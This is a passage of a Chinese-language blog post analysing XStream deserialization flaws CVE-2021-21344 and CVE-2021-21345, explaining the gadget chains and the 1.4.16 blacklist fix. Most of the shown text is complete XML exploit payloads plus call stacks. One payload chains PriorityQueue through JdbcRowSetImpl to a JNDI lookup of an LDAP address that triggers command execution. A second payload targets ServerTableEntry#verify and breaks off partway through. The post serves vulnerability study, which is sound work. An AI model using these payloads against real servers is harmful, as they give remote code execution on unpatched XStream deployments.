(com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:122, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:118, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">putCurrentEntryIntoMap:107, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">populateMap:98, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">populateMap:92, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:87, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.map)</span><br></pre></td></tr></table></figure><h2 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h2><h3 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h3><h4 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><h4 id="版本说明-5"><a href="#版本说明-5" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单<code>sun.awt.datatransfer.DataTransferer$IndexOrderComparator</code> ，导致链子断了。<br><a href="https://github.com/x-stream/xstream/compare/XSTREAM_1_4_15...XSTREAM_1_4_16#diff-25808589fab633152848e5b504af8646ee4fa4b9e97765bdf6a3598870869d04L651">https://github.com/x-stream/xstream/compare/XSTREAM_1_4_15...XSTREAM_1_4_16#diff-25808589fab633152848e5b504af8646ee4fa4b9e97765bdf6a3598870869d04L651</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/18b4a0d4e69daa5aaf1b82e71d0b0993.png"></li></ul><h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：在xml转java对象时，<code>SerializableConverter#doUnmarshal</code> 会调用标签所对应的类的readObject方法，例如test&#x2F;DemoForUsage 里能够调用 Person 类的readObject。这几乎是万能source了，只要有其他组件就能利用。CVE-2021-21344 以<code>java.util.PriorityQueue</code>为入口，找到一条触发  <code>JdbcRowSetImpl#connect</code>的链子，进行 JNDI 注入。</p><p>PS：除了默认的序列化方法，在<code>SerializableConverter#doMarshal</code>中支持重写方法writeObject的调用，所以当类实现了Serializable并且重写了writeObject，则会调用重写的writeObject。</p><p>一般在重写的writeObject方法中还是会调用SerializableConverter.defaultWriteObject方法来进行属性的序列化。 </p><p>下面是poc，需要起一个恶意本地 LDAP 服务器，接收 lookup。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>ldap://127.0.0.1:1389/Basic/Command/calc<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SerializableConverter 触发 PriorityQueue 的反序列化，一直到 PriorityQueue#siftDownUsingComparator 都和 CC4 一样，只不过本链后面走的是 DataTransferer$IndexedComparator#compare，CC4 走的是 TransformingComparator#compare。</p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h3><h4 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><h4 id="版本说明-6"><a href="#版本说明-6" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和CVE-2021-21344一样</li></ul><h4 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：source 还是<code>PriorityQueue#readObject</code>，只不过 sink 不用   <code>JdbcRowSetImpl#connect</code> 打 JNDI，改用<code>ServerTableEntry#verify</code>  打命令执行。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/bfaee77a5c813ed23e9a0d49f010b133.png"></p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span 